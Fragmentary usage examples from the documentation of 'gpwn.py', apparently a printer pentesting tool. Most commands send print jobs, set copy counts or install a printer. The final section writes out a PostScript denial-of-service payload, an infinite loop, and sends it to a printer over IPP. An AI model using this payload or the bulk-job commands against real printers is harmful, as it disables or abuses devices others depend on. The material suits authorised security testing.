...
python gpwn.py 192.168.1.100 --send-job document.txt

# Same as above (auto is default)
python gpwn.py 192.168.1.100 --send-job photo.jpg --send-proto auto
```
...
python gpwn.py 192.168.1.100 --send-job doc.pdf

# IPP / IPPS — AirPrint compatible, auto-upgrades to TLS if required
python gpwn.py 192.168.1.100 --send-job doc.pdf --send-proto ipp

# LPD (port 515) — ESC/P native for Epson inkjets, prevents stuck-print issues
python gpwn.py 192.168.1.100 --send-job doc.pdf --send-proto lpd

# RAW (port 9100) — JetDirect passthrough for HP/PCL laser printers
python gpwn.py 192.168.1.100 --send-job doc.pdf --send-proto raw
```
...
```bash
python gpwn.py 192.168.1.100 --send-job flyer.pdf --send-copies 10
python gpwn.py 192.168.1.100 --send-job memo.txt  --send-copies 50
```
...
```bash
python gpwn.py 192.168.1.100 --send-job doc.txt --send-proto lpd --send-queue lp
python gpwn.py 192.168.1.100 --send-job doc.txt --send-proto lpd --send-queue raw
```
...
python gpwn.py 192.168.1.100 --install-printer

# With custom driver mode
python gpwn.py 192.168.1.100 --install-printer --install-driver cups-ipp
python gpwn.py 192.168.1.100 --install-printer --install-driver epson

# With custom name
python gpwn.py 192.168.1.100 --install-printer --install-name "LabPrinter"
```
...
python gpwn.py 192.168.1.100 --send-job payload.txt --send-proto lpd

# PostScript DoS via IPP
echo "{ } loop" > payload.ps
python gpwn.py 192.168.1.100 --send-job payload.ps --send-proto ipp
```
